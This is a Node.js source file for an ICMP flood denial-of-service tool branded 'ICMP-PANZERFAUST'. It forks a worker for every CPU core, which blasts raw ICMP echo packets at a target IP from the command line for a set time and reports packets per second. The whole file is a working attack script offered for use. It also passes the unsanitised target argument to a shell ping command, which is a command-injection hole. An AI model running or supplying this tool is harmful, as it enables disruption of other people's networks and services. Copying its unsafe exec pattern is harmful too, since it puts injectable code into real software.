const raw = require('raw-socket');
const cluster = require('cluster');
const os = require('os');
const { exec } = require('child_process');

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;

if (!target || isNaN(duration)) {
  console.log('Usage: node attack.js <target_ip> <duration_sec>');
  process.exit(1);
}

const cores = os.cpus().length;
const end = Date.now() + duration;

if (cluster.isMaster) {
  let stats = { sent: 0, success: 0, failed: 0, maxpps: 0 };
  let lastLatency = 'N/A';

  console.clear();
  console.log('ICMP-PANZERFAUST [JS-SAFE-SMASH]');
  console.log('--------------------------------------');
  console.log(`Target: ${target}`);
  console.log(`Duration: ${duration / 1000}s`);
  console.log(`Using ${cores} cores`);
  console.log('Launching attack...\n');

  for (let i = 0; i < cores; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        stats.sent += msg.sent;
        stats.success += msg.success;
        stats.failed += msg.failed;
        if (msg.pps > stats.maxpps) stats.maxpps = msg.pps;
      }
    });
  }

  setInterval(() => {
    console.clear();
    console.log('ICMP-PANZERFAUST [JS-SAFE-SMASH]');
    console.log('--------------------------------------');
    console.log(`Success: ${stats.success}`);
    console.log(`Failed: ${stats.failed}`);
    console.log(`Max PPS: ${stats.maxpps}`);
    console.log(`Total Sent: ${stats.sent}`);
    console.log(`Target Latency: ${lastLatency} ms`);
    console.log('--------------------------------------');
  }, 100);

  setInterval(() => {
    exec(`ping -c 1 ${target}`, (err, stdout) => {
      const match = stdout.match(/time=([\d.]+) ms/);
      if (match) lastLatency = match[1];
    });
  }, 4000);

  setTimeout(() => {
    for (const id in cluster.workers) cluster.workers[id].kill();
    console.log('\nAttack complete.');
    process.exit(0);
  }, duration);
} else {
  const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

  let seq = 0;
  let sent = 0;
  let success = 0;
  let failed = 0;
  let pps = 0;

  function checksum(buf) {
    let sum = 0;
    for (let i = 0; i < buf.length; i += 2) sum += buf.readUInt16BE(i);
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return ~sum & 0xffff;
  }

  function packet(seq) {
    const buf = Buffer.alloc(8);
    buf.writeUInt8(8, 0); // type
    buf.writeUInt8(0, 1); // code
    buf.writeUInt16BE(0, 2); // checksum placeholder
    buf.writeUInt16BE(process.pid & 0xffff, 4); // ID
    buf.writeUInt16BE(seq & 0xffff, 6); // seq
    buf.writeUInt16BE(checksum(buf), 2);
    return buf;
  }

  function loop() {
    if (Date.now() >= end) return;
    const pkt = packet(seq++);
    socket.send(pkt, 0, pkt.length, target, (err) => {
      sent++;
      pps++;
      if (err) failed++;
      else success++;
    });
    setImmediate(loop);
  }

  loop();

  setInterval(() => {
    process.send({ type: 'stats', sent, success, failed, pps });
    sent = success = failed = pps = 0;
  }, 100);
}
